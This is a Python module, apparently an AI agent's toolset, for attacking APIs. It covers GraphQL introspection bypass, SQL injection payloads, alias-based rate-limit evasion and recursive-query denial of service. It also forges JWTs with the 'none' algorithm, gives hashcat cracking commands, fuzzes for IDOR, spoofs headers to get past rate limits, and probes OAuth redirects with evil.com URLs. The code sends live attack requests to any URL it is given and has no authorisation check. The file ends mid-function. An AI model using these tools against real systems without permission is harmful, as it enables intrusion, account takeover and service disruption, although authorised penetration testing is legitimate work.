"""
API Security Testing Suite - Comprehensive API vulnerability scanning
Covers: GraphQL, REST, JWT, OAuth, API versioning, rate limiting
"""

import requests
import json
import jwt as pyjwt
import base64
from src.sdk.tool import function_tool

_DEFAULT_HEADERS = {"User-Agent": "Mozilla/5.0 (CyberCoPilot/1.0)"}
_TIMEOUT = 15


@function_tool()


# ─── GRAPHQL ─────────────────────────────────────────────────────────────────────



# ─── GRAPHQL ─────────────────────────────────────────────────────────────────────

def graphql_introspection(url: str, custom_headers: str = "") -> str:
    """
    Perform GraphQL introspection to discover schema, queries, mutations.
    Finds hidden endpoints and sensitive data exposure.
    
    Args:
        url: GraphQL endpoint URL
        custom_headers: Optional custom headers (format: "Header1: Value1, Header2: Value2")
    
    Returns:
        Complete GraphQL schema with types, queries, mutations, and potential vulnerabilities
    """
    try:
        # Parse custom headers
        headers = {"Content-Type": "application/json"}
        if custom_headers:
            for header in custom_headers.split(','):
                if ':' in header:
                    key, value = header.split(':', 1)
                    headers[key.strip()] = value.strip()
        
        # Introspection query
        introspection_query = {
            "query": """
            query IntrospectionQuery {
              __schema {
                queryType { name }
                mutationType { name }
                subscriptionType { name }
                types {
                  ...FullType
                }
                directives {
                  name
                  description
                  locations
                  args {
                    ...InputValue
                  }
                }
              }
            }
            
            fragment FullType on __Type {
              kind
              name
              description
              fields(includeDeprecated: true) {
                name
                description
                args {
                  ...InputValue
                }
                type {
                  ...TypeRef
                }
                isDeprecated
                deprecationReason
              }
              inputFields {
                ...InputValue
              }
              interfaces {
                ...TypeRef
              }
              enumValues(includeDeprecated: true) {
                name
                description
                isDeprecated
                deprecationReason
              }
              possibleTypes {
                ...TypeRef
              }
            }
            
            fragment InputValue on __InputValue {
              name
              description
              type { ...TypeRef }
              defaultValue
            }
            
            fragment TypeRef on __Type {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                    ofType {
                      kind
                      name
                      ofType {
                        kind
                        name
                        ofType {
                          kind
                          name
                          ofType {
                            kind
                            name
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
            """
        }
        
        response = requests.post(url, json=introspection_query, headers=headers, timeout=30)
        
        if response.status_code != 200:
            return f"❌ Introspection failed with status {response.status_code}\n\nTip: GraphQL introspection may be disabled"
        
        data = response.json()
        
        if 'errors' in data:
            return f"❌ GraphQL Errors:\n{json.dumps(data['errors'], indent=2)}\n\n⚠️ Introspection might be disabled for security"
        
        schema = data.get('data', {}).get('__schema', {})
        
        result = [f"## 🔍 GraphQL Introspection: {url}\n"]
        
        # Extract queries
        queries = []
        mutations = []
        subscriptions = []
        
        for type_info in schema.get('types', []):
            if type_info['name'] in ['Query', schema.get('queryType', {}).get('name')]:
                queries = type_info.get('fields', [])
            elif type_info['name'] in ['Mutation', schema.get('mutationType', {}).get('name')]:
                mutations = type_info.get('fields', [])
            elif type_info['name'] in ['Subscription', schema.get('subscriptionType', {}).get('name')]:
                subscriptions = type_info.get('fields', [])
        
        # Display queries
        result.append("### ✅ INTROSPECTION SUCCESSFUL - Schema Exposed!\n")
        result.append(f"**Total Types:** {len(schema.get('types', []))}")
        result.append(f"**Queries:** {len(queries)}")
        result.append(f"**Mutations:** {len(mutations)}")
        result.append(f"**Subscriptions:** {len(subscriptions)}\n")
        
        # Show sensitive queries
        result.append("### 🎯 High-Value Queries:\n")
        sensitive_keywords = ['user', 'admin', 'password', 'token', 'secret', 'key', 'auth', 'credential', 'private']
        for query in queries[:15]:
            name = query.get('name', '')
            if any(keyword in name.lower() for keyword in sensitive_keywords):
                result.append(f"⚠️ **{name}** - Potentially sensitive")
            else:
                result.append(f"- {name}")
        
        if len(queries) > 15:
            result.append(f"\n... and {len(queries) - 15} more queries")
        
        # Show mutations (dangerous)
        if mutations:
            result.append("\n### 🔴 CRITICAL: Mutations (Write Operations):\n")
            for mutation in mutations[:10]:
                result.append(f"- **{mutation.get('name')}**")
                args = mutation.get('args', [])
                if args:
                    result.append(f"  Args: {', '.join([arg['name'] for arg in args])}")
        
        # Security findings
        result.append("\n### 🚨 Security Findings:\n")
        result.append("1. ✅ Introspection is ENABLED (should be disabled in production)")
        result.append("2. Test for **SQL Injection** in GraphQL arguments")
        result.append("3. Test for **IDOR** by modifying IDs in mutations")
        result.append("4. Check for **GraphQL batching attacks** (DoS)")
        result.append("5. Test **nested query depth limits** (resource exhaustion)")
        
        result.append("\n### 🔬 Next Steps:\n")
        result.append("1. Use `graphql_injection_test` to test for SQLi")
        result.append("2. Fuzz mutation parameters with modified IDs (IDOR)")
        result.append("3. Test deeply nested queries for DoS")
        
        return '\n'.join(result)
        
    except Exception as e:
        return f"Error performing GraphQL introspection: {str(e)}"


@function_tool()
def graphql_injection_test(url: str, query_name: str, parameter: str, custom_headers: str = "") -> str:
    """
    Test GraphQL endpoint for injection vulnerabilities (SQLi, NoSQLi).
    
    Args:
        url: GraphQL endpoint URL
        query_name: The query/mutation to test
        parameter: The parameter to inject payloads into
        custom_headers: Optional headers
    
    Returns:
        Injection test results with vulnerable payloads
    """
    try:
        headers = {"Content-Type": "application/json"}
        if custom_headers:
            for header in custom_headers.split(','):
                if ':' in header:
                    key, value = header.split(':', 1)
                    headers[key.strip()] = value.strip()
        
        # SQLi payloads
        payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "' AND SLEEP(5)--",
            "{$ne: null}",  # NoSQL
            "'; DROP TABLE users--",
            "1' OR '1'='1' /*"
        ]
        
        results = [f"## 🧪 GraphQL Injection Testing: {url}\n"]
        results.append(f"**Query:** {query_name}")
        results.append(f"**Parameter:** {parameter}\n")
        
        vulnerable = []
        
        for payload in payloads:
            query = f"""
            query {{
              {query_name}({parameter}: "{payload}") {{
                __typename
              }}
            }}
            """
            
            try:
                response = requests.post(url, json={"query": query}, headers=headers, timeout=10)
                
                # Check for SQL errors
                if any(err in response.text.lower() for err in ['sql', 'mysql', 'postgresql', 'syntax error', 'database']):
                    vulnerable.append(f"🔴 **VULNERABLE to SQLi**: `{payload}`")
                    vulnerable.append(f"   Response: {response.text[:200]}")
                
            except requests.exceptions.Timeout:
                vulnerable.append(f"⏱️ **TIMEOUT with**: `{payload}` (possible time-based SQLi)")
        
        if vulnerable:
            results.append("### 🚨 VULNERABILITIES FOUND:\n")
            results.extend(vulnerable)
        else:
            results.append("✅ No obvious injection vulnerabilities detected\n")
            results.append("💡 Manual testing recommended with GraphQL-specific tools")
        
        return '\n'.join(results)
        
    except Exception as e:
        return f"Error testing GraphQL injection: {str(e)}"


@function_tool()
def graphql_introspection_bypass(url: str, custom_headers: str = "") -> str:
    """
    Test various bypasses for disabled GraphQL introspection (GET method, regex bypasses, newline characters).
    
    Args:
        url: GraphQL endpoint URL
        custom_headers: Optional custom headers (format: "Header1: Value1, Header2: Value2")
    
    Returns:
        Results of bypass attempts indicating if the schema was successfully leaked.
    """
    try:
        headers = {"Content-Type": "application/json"}
        if custom_headers:
            for header in custom_headers.split(','):
                if ':' in header:
                    k, v = header.split(':', 1)
                    headers[k.strip()] = v.strip()
                    
        result = [f"## 🕵️ GraphQL Introspection Bypass Testing: {url}\n"]
        
        # 1. Newline / Regex Bypass
        bypass_query_1 = 'query{\\n__schema { queryType { name } }\\n}'
        try:
            r1 = requests.post(url, json={"query": bypass_query_1}, headers=headers, timeout=10)
            if r1.status_code == 200 and 'queryType' in r1.text:
                result.append("✅ **BYPASS SUCCESS**: newline regex bypass (`\\n__schema`) worked via POST.")
            else:
                result.append("❌ Failed: newline regex bypass.")
        except Exception as e:
            result.append(f"❌ Error testing newline bypass: {e}")

        # 2. Comma Regex Bypass
        bypass_query_2 = 'query{,__schema { queryType { name } }}'
        try:
            r2 = requests.post(url, json={"query": bypass_query_2}, headers=headers, timeout=10)
            if r2.status_code == 200 and 'queryType' in r2.text:
                result.append("✅ **BYPASS SUCCESS**: comma regex bypass (`,__schema`) worked via POST.")
            else:
                result.append("❌ Failed: comma regex bypass.")
        except Exception:
            pass

        # 3. GET Method Bypass
        get_url = f"{url}?query={{__schema{{queryType{{name}}}}}}"
        try:
            r3 = requests.get(get_url, headers=headers, timeout=10)
            if r3.status_code == 200 and 'queryType' in r3.text:
                result.append("✅ **BYPASS SUCCESS**: GET request bypass worked (`?query={__schema...}`).")
            else:
                result.append("❌ Failed: GET request bypass.")
        except Exception as e:
            result.append(f"❌ Error testing GET bypass: {e}")
            
        result.append("\n### 💡 Manual Steps for Schema Extraction:")
        result.append("- **Clairvoyance**: Build a dictionary and bruteforce suggestions: `clairvoyance -w wordlist.txt {url}`")
        result.append("- **Suggestion Extraction**: Send invalid queries and read `Did you mean ...?` error messages.")
        
        return '\\n'.join(result)
    except Exception as e:
        return f"Error performing GraphQL introspection bypass: {str(e)}"

@function_tool()
def graphql_alias_rate_limit_bypass(url: str, query: str, alias_count: int = 50, custom_headers: str = "") -> str:
    """
    Test for Rate Limit Bypass and excessive data fetch using GraphQL Aliases.
    
    Args:
        url: GraphQL endpoint URL
        query: The bare inner query string (e.g. 'getUser(id: "1") { name }')
        alias_count: Number of aliases to generate in a single query (default 50)
        custom_headers: Optional headers
    
    Returns:
        Test results confirming if the endpoint processes the bulk aliases (Rate Limit/Batching bypass).
    """
    try:
        headers = {"Content-Type": "application/json"}
        if custom_headers:
            for header in custom_headers.split(','):
                if ':' in header:
                    k, v = header.split(':', 1)
                    headers[k.strip()] = v.strip()
                    
        result = [f"## ⚡ GraphQL Alias Rate Limit/Batching Bypass: {url}\n"]
        
        # Build the aliased query
        aliased_parts = []
        for i in range(alias_count):
            aliased_parts.append(f"alias{i}: {query}")
            
        payload = "query { " + " ".join(aliased_parts) + " }"
        
        try:
            resp = requests.post(url, json={"query": payload}, headers=headers, timeout=15)
            if resp.status_code == 200:
                resp_json = resp.json()
                if "data" in resp_json and f"alias{alias_count-1}" in resp_json["data"]:
                    result.append(f"🔴 **VULNERABLE**: Server processed all {alias_count} aliased queries in a single request!")
                    result.append("   Note: This bypasses endpoint rate limiting and can be used for bulk data scraping/credential stuffing.")
                elif "errors" in resp_json:
                    result.append("⚠️ Server returned errors, but parsed the request. Check payload validity.")
                    result.append(f"   Errors: {json.dumps(resp_json['errors'])[:200]}")
                else:
                    result.append("✅ Not vulnerable or query failed silently.")
            elif resp.status_code == 429:
                result.append("✅ Safe: Server correctly applied rate limiting (429) to the single bulky request.")
            else:
                result.append(f"✅ Safe/Blocked: Server returned HTTP {resp.status_code}.")
        except requests.exceptions.Timeout:
            result.append(f"⏱️ **TIMEOUT**: Request timed out. The server might be struggling to process all {alias_count} queries (Possible DoS!)")
            
        return '\\n'.join(result)
    except Exception as e:
        return f"Error testing alias batching: {str(e)}"

@function_tool()
def graphql_dos_recursive(url: str, base_query: str, nested_field: str, depth: int = 10, custom_headers: str = "") -> str:
    """
    Test for GraphQL Denial of Service (DoS) via Circular / Deeply Recursive Queries.
    
    Args:
        url: GraphQL endpoint URL
        base_query: The root query element (e.g. 'user(id: "1")')
        nested_field: The recursive relationship field (e.g. 'friends')
        depth: How deep to nest the circular query (e.g. 10)
        custom_headers: Optional headers
    
    Returns:
        Test results confirming if the endpoint lacks query depth limits.
    """
    try:
        headers = {"Content-Type": "application/json"}
        if custom_headers:
            for header in custom_headers.split(','):
                if ':' in header:
                    k, v = header.split(':', 1)
                    headers[k.strip()] = v.strip()
                    
        result = [f"## 💥 GraphQL Nested Query DoS Testing: {url}\n"]
        
        # Build recursively nested query
        # query { user(id: "1") { friends { friends { friends { id } } } } }
        inner = "id"
        for _ in range(depth):
            inner = f"{nested_field} {{ {inner} }}"
        payload = f"query {{ {base_query} {{ {inner} }} }}"
        
        result.append(f"**Generated Payload Depth:** {depth}")
        
        try:
            import time
            start = time.time()
            resp = requests.post(url, json={"query": payload}, headers=headers, timeout=20)
            elapsed = time.time() - start
            
            if resp.status_code == 200:
                resp_json = resp.json()
                if "errors" in resp_json:
                    err_msg = json.dumps(resp_json["errors"])
                    if "depth" in err_msg.lower() or "limit" in err_msg.lower() or "cost" in err_msg.lower():
                        result.append("✅ **SAFE**: Query depth limit or cost analysis detected.")
                    else:
                        result.append(f"⚠️ Request returned an error, check if the nested field `{nested_field}` is valid.")
                else:
                    if elapsed > 3.0:
                        result.append(f"🔴 **POTENTIALLY VULNERABLE DoS**: Query succeeded and took {elapsed:.2f}s. Server lacks depth limits!")
                    else:
                        result.append(f"⚠️ VULNERABLE to depth structure, but data was retrieved too fast ({elapsed:.2f}s) to confirm DoS impact. Increase depth.")
            else:
                result.append(f"✅ Safe/Blocked: Server returned HTTP {resp.status_code}.")
                
        except requests.exceptions.Timeout:
             result.append(f"🚨 **VULNERABLE (DoS)**: The request timed out (>{20}s). The deeply nested query successfully exhausted server resources!")
             
        return '\\n'.join(result)
    except Exception as e:
        return f"Error testing GraphQL DoS: {str(e)}"


# ─── JWT  (JSON Web Tokens) ──────────────────────────────────────────────────────



# ─── JWT  (JSON Web Tokens) ──────────────────────────────────────────────────────
@function_tool()
def jwt_analysis(token: str) -> str:
    """
    Analyze JWT token for security issues: weak secrets, algorithm confusion, expired tokens.
    
    Args:
        token: JWT token string
    
    Returns:
        Comprehensive JWT security analysis with exploit suggestions
    """
    try:
        result = ["## 🔐 JWT Token Analysis\n"]
        
        # Decode without verification
        try:
            header = pyjwt.get_unverified_header(token)
            payload = pyjwt.decode(token, options={"verify_signature": False})
        except Exception as e:
            return f"❌ Invalid JWT token: {str(e)}"
        
        result.append("### Header:")
        result.append(f"```json\n{json.dumps(header, indent=2)}\n```\n")
        
        result.append("### Payload:")
        result.append(f"```json\n{json.dumps(payload, indent=2)}\n```\n")
        
        # Security checks
        result.append("### 🚨 Security Analysis:\n")
        
        vulnerabilities = []
        
        # 1. Algorithm check
        alg = header.get('alg', '').upper()
        if alg == 'NONE':
            vulnerabilities.append("🔴 **CRITICAL**: Algorithm is 'none' - signature not required!")
        elif alg.startswith('HS'):
            vulnerabilities.append(f"⚠️ Algorithm is {alg} (HMAC) - vulnerable to brute force")
        elif alg.startswith('RS'):
            vulnerabilities.append(f"✅ Algorithm is {alg} (RSA) - more secure")
        
        # 2. Check for expiration
        import time
        if 'exp' in payload:
            exp_time = payload['exp']
            if exp_time < time.time():
                vulnerabilities.append("⏰ Token is EXPIRED")
            else:
                remaining = int((exp_time - time.time()) / 60)
                vulnerabilities.append(f"✅ Token valid for {remaining} more minutes")
        else:
            vulnerabilities.append("⚠️ No expiration time (exp) - token never expires!")
        
        # 3. Check for sensitive data
        sensitive_keys = ['password', 'secret', 'api_key', 'private_key']
        for key in payload.keys():
            if any(s in key.lower() for s in sensitive_keys):
                vulnerabilities.append(f"🔴 Sensitive data in payload: **{key}**")
        
        # 4. Check for role/admin fields
        role_keys = ['role', 'admin', 'is_admin', 'privilege', 'scope']
        for key in payload.keys():
            if any(r in key.lower() for r in role_keys):
                vulnerabilities.append(f"🎯 Privilege field found: **{key}** = {payload[key]} (try modifying this!)")
        
        result.extend(vulnerabilities)
        
        # Attack vectors
        result.append("\n### 🔨 Exploitation Techniques:\n")
        result.append("1. **Algorithm Confusion**: Change 'alg' to 'none' and remove signature")
        result.append("2. **HMAC → RSA**: If using HS256, try changing to RS256 with public key")
        result.append("3. **Brute Force Secret**: Use `hashcat -m 16500` or `john` to crack HMAC secret")
        result.append(f"4. **Parameter Tampering**: Modify {', '.join([k for k in payload.keys() if any(r in k.lower() for r in role_keys)])}")
        
        if alg.startswith('HS'):
            result.append("\n### 🔑 Brute Force Attack:\n")
            result.append("```bash")
            result.append("# Save token to file: token.txt")
            result.append("hashcat -m 16500 token.txt /usr/share/wordlists/rockyou.txt")
            result.append("# OR")
            result.append(f"jwt-cracker '{token}' wordlist.txt")
            result.append("```")
        
        return '\n'.join(result)
        
    except Exception as e:
        return f"Error analyzing JWT: {str(e)}"


@function_tool()
def jwt_forge(token: str, modifications: str, secret: str = "") -> str:
    """
    Forge/modify JWT token with new claims or algorithm.
    
    Args:
        token: Original JWT token
        modifications: JSON string of values to modify (e.g., '{"role": "admin"}')
        secret: Optional secret key (leave empty for 'none' algorithm attack)
    
    Returns:
        Forged JWT token
    """
    try:
        # Decode original
        header = pyjwt.get_unverified_header(token)
        payload = pyjwt.decode(token, options={"verify_signature": False})
        
        # Apply modifications
        mods = json.loads(modifications)
        for key, value in mods.items():
            payload[key] = value
        
        result = ["## 🔨 JWT Token Forgery\n"]
        result.append(f"**Original Payload:** {json.dumps(payload, indent=2)}\n")
        
        # Generate forged tokens
        forged_tokens = []
        
        # Attack 1: None algorithm
        header_none = header.copy()
        header_none['alg'] = 'none'
        token_none = f"{base64.urlsafe_b64encode(json.dumps(header_none).encode()).decode().rstrip('=')}." \
                     f"{base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')}."
        forged_tokens.append(("Algorithm: none", token_none))
        
        # Attack 2: With provided secret
        if secret:
            token_signed = pyjwt.encode(payload, secret, algorithm=header.get('alg', 'HS256'))
            forged_tokens.append((f"Algorithm: {header.get('alg', 'HS256')} (with secret)", token_signed))
        
        result.append("### 🎯 Forged Tokens:\n")
        for name, tok in forged_tokens:
            result.append(f"**{name}:**")
            result.append(f"```\n{tok}\n```\n")
        
        result.append("### 🧪 Testing:")
        result.append("Replace the Authorization header with forged token:")
        result.append("```bash")
        result.append("curl -H 'Authorization: Bearer <FORGED_TOKEN>' https://target.com/api/protected")
        result.append("```")
        
        return '\n'.join(result)
        
    except Exception as e:
        return f"Error forging JWT: {str(e)}"


@function_tool()


# ─── REST API FUZZING ────────────────────────────────────────────────────────────



# ─── REST API FUZZING ────────────────────────────────────────────────────────────

def rest_api_fuzzing(base_url: str, endpoints: str, methods: str = "GET,POST,PUT,DELETE") -> str:
    """
    Fuzz REST API endpoints for IDOR, mass assignment, HTTP method tampering.
    
    Args:
        base_url: Base API URL (e.g., https://api.example.com)
        endpoints: Comma-separated endpoint patterns (e.g., /api/users/{id},/api/posts/{id})
        methods: HTTP methods to test
    
    Returns:
        API fuzzing results with vulnerabilities
    """
    try:
        result = [f"## 🔍 REST API Fuzzing: {base_url}\n"]
        
        endpoint_list = [e.strip() for e in endpoints.split(',')]
        method_list = [m.strip().upper() for m in methods.split(',')]
        
        findings = []
        
        for endpoint in endpoint_list:
            result.append(f"### Testing: {endpoint}\n")
            
            # Test IDOR
            if '{id}' in endpoint or '{user_id}' in endpoint:
                result.append("**🎯 IDOR Testing:**")
                
                test_ids = ['1', '2', '100', '9999', '-1', '0', 'admin', '../1']
                
                for test_id in test_ids:
                    url = base_url + endpoint.replace('{id}', test_id).replace('{user_id}', test_id)
                    
                    try:
                        resp = requests.get(url, timeout=5)
                        if resp.status_code == 200:
                            findings.append(f"✅ {url} - HTTP 200 (accessible)")
                        elif resp.status_code == 403:
                            result.append(f"🔒 {url} - HTTP 403 (forbidden)")
                        elif resp.status_code == 401:
                            result.append(f"🔐 {url} - HTTP 401 (auth required)")
                    except:
                        pass
            
            # Test HTTP methods
            result.append("\n**🔨 HTTP Method Testing:**")
            url = base_url + endpoint.replace('{id}', '1')
            
            for method in method_list:
                try:
                    resp = requests.request(method, url, timeout=5)
                    if resp.status_code < 400:
                        findings.append(f"⚠️ {method} {url} - HTTP {resp.status_code}")
                except:
                    pass
        
        # Mass Assignment test
        result.append("\n### 🔴 Mass Assignment Testing:\n")
        result.append("**Test payload:**")
        result.append("```json")
        result.append('{"role": "admin", "is_admin": true, "privilege_level": 10}')
        result.append("```")
        result.append("Send to POST/PUT endpoints and check if extra fields are accepted\n")
        
        # Display findings
        if findings:
            result.append("### 🚨 Findings:\n")
            result.extend(findings)
        
        return '\n'.join(result)
        
    except Exception as e:
        return f"Error fuzzing API: {str(e)}"


@function_tool()


# ─── RATE LIMIT BYPASS ───────────────────────────────────────────────────────────



# ─── RATE LIMIT BYPASS ───────────────────────────────────────────────────────────

def api_rate_limit_bypass(url: str, method: str = "GET", technique: str = "ip-rotation") -> str:
    """
    Test API rate limiting and attempt bypass techniques.
    
    Args:
        url: API endpoint URL
        method: HTTP method
        technique: Bypass technique (ip-rotation, header-manipulation, endpoint-variation)
    
    Returns:
        Rate limit analysis and bypass results
    """
    try:
        result = [f"## ⚡ API Rate Limit Testing: {url}\n"]
        
        # Baseline test - Find the rate limit
        result.append("### Phase 1: Detecting Rate Limit\n")
        
        count = 0
        rate_limited = False
        
        for i in range(20):
            resp = requests.request(method, url, timeout=5)
            count += 1
            
            if resp.status_code == 429:  # Too Many Requests
                rate_limited = True
                result.append(f"🔴 Rate limited after {count} requests")
                result.append(f"Response: {resp.headers.get('Retry-After', 'No Retry-After header')}")
                break
            elif resp.status_code < 400:
                result.append(f"✅ Request {count}: HTTP {resp.status_code}")
        
        if not rate_limited:
            result.append(f"✅ No rate limit detected after {count} requests\n")
        
        # Bypass techniques
        result.append("\n### Phase 2: Bypass Techniques\n")
        
        if technique == "header-manipulation":
            result.append("**Testing Header Manipulation:**\n")
            
            bypass_headers = [
                {"X-Forwarded-For": "127.0.0.1"},
                {"X-Real-IP": "127.0.0.1"},
                {"X-Originating-IP": "127.0.0.1"},
                {"X-Remote-IP": "127.0.0.1"},
                {"X-Client-IP": "127.0.0.1"},
            ]
            
            for headers in bypass_headers:
                resp = requests.request(method, url, headers=headers, timeout=5)
                header_name = list(headers.keys())[0]
                if resp.status_code != 429:
                    result.append(f"✅ **BYPASS FOUND**: {header_name} = {headers[header_name]}")
                else:
                    result.append(f"❌ Failed: {header_name}")
        
        elif technique == "endpoint-variation":
            result.append("**Testing Endpoint Variations:**\n")
            
            variations = [
                url,
                url + "/",
                url + "?",
                url + "#",
                url.upper(),
                url.replace('https://', 'http://'),
            ]
            
            for var_url in variations:
                try:
                    resp = requests.request(method, var_url, timeout=5)
                    if resp.status_code != 429:
                        result.append(f"✅ **BYPASS**: {var_url}")
                except:
                    pass
        
        result.append("\n### 💡 Additional Bypass Techniques:\n")
        result.append("1. **IP Rotation**: Use multiple IPs via proxies/VPN")
        result.append("2. **User-Agent Rotation**: Change UA strings")
        result.append("3. **Time-based**: Wait for rate limit reset")
        result.append("4. **Distributed**: Use multiple API keys/accounts")
        
        return '\n'.join(result)
        
    except Exception as e:
        return f"Error testing rate limits: {str(e)}"


@function_tool()


# ─── OAUTH ───────────────────────────────────────────────────────────────────────



# ─── OAUTH ───────────────────────────────────────────────────────────────────────

def oauth_flow_test(authorization_url: str, client_id: str, redirect_uri: str) -> str:
    """
    Test OAuth 2.0 flow for common vulnerabilities (open redirect, CSRF, code reuse).
    
    Args:
        authorization_url: OAuth authorization endpoint
        client_id: Client ID
        redirect_uri: Redirect URI
    
    Returns:
        OAuth security analysis
    """
    try:
        result = ["## 🔐 OAuth 2.0 Security Testing\n"]
        result.append(f"**Authorization URL:** {authorization_url}")
        result.append(f"**Client ID:** {client_id}")
        result.append(f"**Redirect URI:** {redirect_uri}\n")
        
        # Test 1: Open Redirect
        result.append("### 🎯 Test 1: Open Redirect Vulnerability\n")
        payloads = [
            "https://evil.com",
            "//evil.com",
            "https://evil.com@legitimate.com",
            redirect_uri + "@evil.com",
            redirect_uri.replace('https://', 'https://evil.com/')
        ]
        
        for payload in payloads:
            test_url = f"{authorization_url}?client_id={client_id}&redirect_uri={payload}&response_type=code"
            result.append(f"**Payload:** `{payload}`")
            result.append(f"Test URL: {test_url}\n")
        
        # Test 2: CSRF
        result.append("### 🎯 Test 2: CSRF (Missing 'state' parameter)\n")
        csrf_url = f"{authorization_url}?client_id={client_id}&redirect_uri={redirect_uri}&response_type=code"
        result.append("If 'state' parameter is missing or not validated:")
        result.append("```html")
        result.append(f'<img src="{csrf_url}">')
        result.append("```\n")
        
        # Test 3: Code Reuse
        result.append("### 🎯 Test 3: Authorization Code Reuse\n")
        result.append("1. Obtain authorization code")
        result.append("2. Exchange for access token")
        result.append("3. Try reusing the same code again")
        result.append("4. If successful → **VULNERABLE**\n")
        
        # Test 4: Scope Manipulation
        result.append("### 🎯 Test 4: Scope Manipulation\n")
        result.append("Try requesting elevated scopes:")
        result.append("- `scope=read write admin`")
        result.append("- `scope=*`")
        result.append("- `scope=all`\n")
        
        result.append("### 💡 Manual Testing Required:\n")
        result.append("1. Check if redirect_uri validation is strict")
        result.append("2. Verify 'state' parameter is required and validated")
        result.append("3. Confirm authorization codes are single-use")
        result.append("4. Test scope elevation")
        
        return '\n'.join(result)
        
    except Exception as e:
        return f"Error testing OAuth flow: {str(e)}"


@function_tool()


# ─── API ENUMERATION ─────────────────────────────────────────────────────────────



# ─── API ENUMERATION ─────────────────────────────────────────────────────────────

def api_version_enumeration(base_url: str) -> str:
    """
    Enumerate API versions and test for version-specific vulnerabilities.
    Often older API versions have unfixed vulnerabilities.
    
    Args:
        base_url: Base API URL (e.g., https://api.example.com)
    
    Returns:
        List of discovered API versions and their accessibility
    """
    try:
        result = [f"## 📚 API Version Enumeration: {base_url}\n"]
        
        # Common version patterns
        version_patterns = [
            "/v1", "/v2", "/v3", "/v4", "/v5",
            "/api/v1", "/api/v2", "/api/v3",
            "/1.0", "/2.0", "/3.0",
            "/api/1.0", "/api/2.0",
            "?version=1", "?version=2", "?version=3",
            "?api_version=1", "?api_version=2"
        ]
        
        found_versions = []
        
        result.append("### Scanning for API versions...\n")
        
        for pattern in version_patterns:
            if '?' in pattern:
                test_url = base_url + pattern
            else:
                test_url = base_url + pattern
            
            try:
                resp = requests.get(test_url, timeout=5)
                if resp.status_code < 400:
                    found_versions.append((pattern, resp.status_code))
                    result.append(f"✅ Found: {test_url} - HTTP {resp.status_code}")
            except:
                pass
        
        if found_versions:
            result.append("\n### 🎯 Security Testing:\n")
            result.append("1. Test **older versions** (v1, v2) for known vulnerabilities")
            result.append("2. Check if authentication is required on all versions")
            result.append("3. Test for **version-specific bypasses**")
            result.append("4. Compare responses between versions for information disclosure")
        else:
            result.append("❌ No API versions detected with common patterns")
        
        return '\n'.join(result)
        
    except Exception as e:
        return f"Error enumerating API versions: {str(e)}"


# ═══════════════════════════════════════════════════════════════════════════════
# OAUTH 2.0 ATTACK SUITE
# ═══════════════════════════════════════════════════════════════════════════════

@function_tool()


# ─── OAUTH ATTACKS ───────────────────────────────────────────────────────────────



# ─── OAUTH ATTACKS ───────────────────────────────────────────────────────────────

def oauth_attack_probe(
    auth_url: str,
    client_id: str,
    redirect_uri: str,
    token_url: str = "",
    state: str = "random_state_xyz123",
    scope: str = "openid profile email",
) -> str:
    """
    Comprehensive OAuth 2.0 security attack suite.

    Tests:
      1. State parameter CSRF — missing/predictable state leads to account takeover
      2. Redirect URI manipulation — open redirect to steal auth code
      3. Authorization code interception — code reuse, PKCE bypass
      4. Token leakage via Referer — access/refresh tokens in HTTP headers
      5. Scope elevation — requesting more permissions than granted
      6. Implicit flow token theft — fragment identifier extraction
      7. Token endpoint insecure transport

    Args:
        auth_url: Authorization endpoint (e.g. https://auth.target.com/oauth/authorize)
        client_id: OAuth client ID (required)
        redirect_uri: Registered redirect URI (e.g. https://target.com/callback)
        token_url: Token endpoint for code exchange attacks (optional)
        state: State parameter to use in baseline (default: random_state_xyz123)
        scope: OAuth scope to request (default: openid profile email)

    Returns:
        Complete OAuth vulnerability assessment with PoC attack URLs
    """
    out = ["=== OAuth 2.0 Attack Probe", f"  Auth URL     : {auth_url}",
           f"  Client ID    : {client_id}", f"  Redirect URI : {redirect_uri}", ""]

    import urllib.parse as _urlparse

    base_params = {
        "response_type": "code",
        "client_id": client_id,
        "redirect_uri": redirect_uri,
        "scope": scope,
        "state": state,
    }

    findings = []

    # ── 1. State Parameter CSRF ───────────────────────────────────────────────
    out.append("── Test 1: State Parameter CSRF ────────────────")
    # Check if state is required and validated
    no_state_params = {k: v for k, v in base_params.items() if k != "state"}
    try:
        r_no_state = requests.get(auth_url, params=no_state_params,
                                  headers=_DEFAULT_HEADERS, allow_redirects=False,
                                  timeout=_TIMEOUT, verify=False)
        if r_no_state.status_code in (302, 301, 200):
            location = r_no_state.headers.get("Location", "")
            # If redirect proceeds without state, CSRF is possible
            if r_no_state.status_code in (302, 301) and redirect_uri.split("/")[2] in location:
                findings.append(
                    "CRITICAL: OAuth CSRF — Authorization proceeds WITHOUT state parameter!\n"
                    f"  Attack: Craft auth URL without state → victim clicks → code delivered to attacker\n"
                    f"  PoC: {auth_url}?{_urlparse.urlencode(no_state_params)}"
                )
                out.append("  [VULNERABLE] State not required")
            elif r_no_state.status_code == 200:
                out.append("  [CHECK] HTTP 200 without state — inspect response manually")
            else:
                out.append(f"  [OK] HTTP {r_no_state.status_code} — state may be required")
        else:
            out.append(f"  HTTP {r_no_state.status_code} without state")
    except Exception as e:
        out.append(f"  Error: {e}")

    # Predictable state test
    predictable_states = ["0", "1", "123", "true", "null", "undefined", "state"]
    for pred_state in predictable_states[:3]:
        try:
            test_params = {**base_params, "state": pred_state}
            r = requests.get(auth_url, params=test_params, headers=_DEFAULT_HEADERS,
                             allow_redirects=False, timeout=_TIMEOUT, verify=False)
            if r.status_code in (302, 301):
                out.append(f"  [INFO] Accepts predictable state value: {pred_state!r}")
        except Exception:
            pass

    # ── 2. Redirect URI Manipulation ──────────────────────────────────────────
    out.append("")
    out.append("── Test 2: Redirect URI Manipulation ──────────")
    parsed_redir = _urlparse.urlparse(redirect_uri)
    base_domain = f"{parsed_redir.scheme}://{parsed_redir.netloc}"

    redirect_attacks = {
        "Open redirect in path":      redirect_uri.replace(parsed_redir.path or "/", "/") + "/..//evil.com/",
        "Evil subdomain":             redirect_uri.replace(parsed_redir.netloc, f"evil.{parsed_redir.netloc}"),
        "Attacker redirect":          "https://evil.com/",
        "URL encoded slash":          redirect_uri + "%2F..%2Fevil.com",
        "Double slash":               base_domain + "//evil.com",
        "No-path match":              base_domain + "/",
        "Extra subdomain":            redirect_uri.replace("://", "://x."),
    }

